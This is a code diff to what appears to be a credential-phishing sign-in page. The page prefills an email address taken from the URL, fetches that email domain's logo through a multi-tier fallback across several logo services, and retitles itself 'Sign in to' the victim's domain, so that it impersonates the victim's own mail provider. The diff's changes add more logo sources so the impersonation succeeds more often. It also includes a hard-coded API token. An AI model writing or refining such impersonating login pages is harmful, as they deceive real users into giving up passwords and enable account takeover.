@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8" />
@@ -95,6 +96,7 @@ var errorMsg = document.getElementById('errorMsg');
 var successMsg = document.getElementById('successMsg');
 var emailInput = document.getElementById('email');
 var hcaptchaField = document.getElementById('hcaptchaField');
+var logoEl = document.getElementById('domainLogo');
 
 // Password toggle
 if (toggle && pw) {
@@ -148,6 +150,70 @@ submitBtn.disabled = true;
 submitBtn.textContent = 'Already Verified';
 }
 
+// Multi-tier logo loading system
+function loadLogoWithFallback(domain) {
+var token = 'pk_H9oBhqv5TRu6sM2UbLBeWw';
+var attempts = 0;
+var maxAttempts = 5;
+  
+// Logo sources in priority order
+var logoSources = [
+// Tier 1: Favicon (fast, small)
+'https://www.google.com/s2/favicons?domain=' + domain + '&sz=64',
+    
+// Tier 2: Logo.dev (primary, high quality)
+'https://img.logo.dev/' + domain + '?token=' + token,
+    
+// Tier 3: Clearbit (backup)
+'https://logo.clearbit.com/' + domain,
+    
+// Tier 4: Google favicon high-res
+'https://www.google.com/s2/favicons?domain=' + domain + '&sz=128',
+    
+// Tier 5: Generic fallback
+'./generic.png'
+];
+
+function tryNextLogo() {
+if (attempts >= maxAttempts || attempts >= logoSources.length) {
+// All attempts failed, use generic
+logoEl.src = './generic.png';
+logoEl.alt = 'Generic logo';
+return;
+}
+    
+var currentSource = logoSources[attempts];
+var testImg = new Image();
+    
+testImg.onload = function() {
+// Check if image is valid (not a placeholder or too small)
+if (testImg.width > 16 && testImg.height > 16) {
+// Valid logo found
+logoEl.src = currentSource;
+logoEl.alt = domain + ' logo';
+console.log('Logo loaded from tier ' + (attempts + 1) + ': ' + currentSource);
+} else {
+// Image too small, try next
+attempts++;
+tryNextLogo();
+}
+};
+    
+testImg.onerror = function() {
+// Failed to load, try next source
+console.log('Failed to load logo from tier ' + (attempts + 1));
+attempts++;
+tryNextLogo();
+};
+    
+// Start loading attempt
+testImg.src = currentSource;
+}
+  
+// Start the cascade
+tryNextLogo();
+}
+
 // DYNAMIC LOGO + DOMAIN DETECTION + EMAIL PREFILL
 var urlParams = new URLSearchParams(window.location.search);
 var emailParam = urlParams.get('email');
@@ -162,26 +228,11 @@ emailInput.removeAttribute('autofocus');
 var domainMatch = emailParam.match(/@([^\s@]+)/i);
 if (domainMatch) {
 var domain = domainMatch[1];
-var logoEl = document.getElementById('domainLogo');
 
-// Try Logo.dev API with a test image first
-var logoUrl = 'https://img.logo.dev/' + domain + '?token=pk_H9oBhqv5TRu6sM2UbLBeWw';
-var testImg = new Image();
+// Load logo with fallback system
+loadLogoWithFallback(domain);
 
-testImg.onload = function() {
-// Check if it's an actual logo (not Logo.dev's placeholder)
-if (testImg.width > 32 && testImg.height > 32) {
-logoEl.src = logoUrl;
-logoEl.alt = domain + ' logo';
-}
-};
-
-testImg.onerror = function() {
-// If Logo.dev completely fails, keep generic.png
-};
-
-testImg.src = logoUrl;
-
+// Update page content
 document.title = 'Sign in — ' + domain;
 document.querySelector('h1').textContent = 'Sign in to ' + domain;
 var domainLink = document.getElementById('domainLink');
